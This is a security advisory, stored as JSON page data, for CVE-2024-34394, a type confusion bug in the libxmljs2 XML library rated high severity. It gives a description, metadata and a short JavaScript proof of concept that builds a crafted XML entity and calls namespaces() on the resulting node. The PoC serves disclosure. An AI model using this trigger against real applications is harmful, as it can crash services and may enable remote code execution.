{"hash":"d760cb06b6c4ae14502d15c188a07152ac165ba6","data":{"post":{"title":"libxmljs2 namespaces type confusion RCE","path":"/vulnerabilities/libxmljs2-namespaces-type-confusion-rce-jfsa-2024-001034098/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>libxmljs2 namespaces type confusion RCE</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>libxmljs2</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>libxmljs2 is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking the namespaces() function (which invokes XmlNode::get_local_namespaces()) on a grand-child of a node that refers to an entity. This vulnerability can lead to denial of service and remote code execution.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code class=\"language-js\">const libxmljs2 = require('libxmljs2');\n\nvar d = `&#x3C;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&#x3C;!DOCTYPE note\n[\n&#x3C;!ENTITY writer PUBLIC \"` + \"A\".repeat(8) + \"B\".repeat(8) + \"C\".repeat(8) + \"D\".repeat(8) + \"P\".repeat(8) + `\" \"JFrog Security\">\n]>\n&#x3C;from>&#x26;writer;&#x3C;/from>\n`;\n\nt = libxmljs2.parseXml(d)\nfrom = t.get('//from')\nc = from.childNodes()[0]\nc2 = c.childNodes()[0] //entity_decl\nn = c2.namespaces(true) //onlyLocal = true\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/marudor/libxmljs2/issues/205\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Original Advisory</a></p>\n","description":"CVE-2024-34394, HIGH, libxmljs2 namespaces type confusion RCE","date_published":"2024-05-02","xray_id":"JFSA-2024-001034098","vul_id":"CVE-2024-34394","severity":"high","discovered_by":"Uriya Yavnieli","last_updated":"2024-05-02","cvss":8.1}},"context":{}}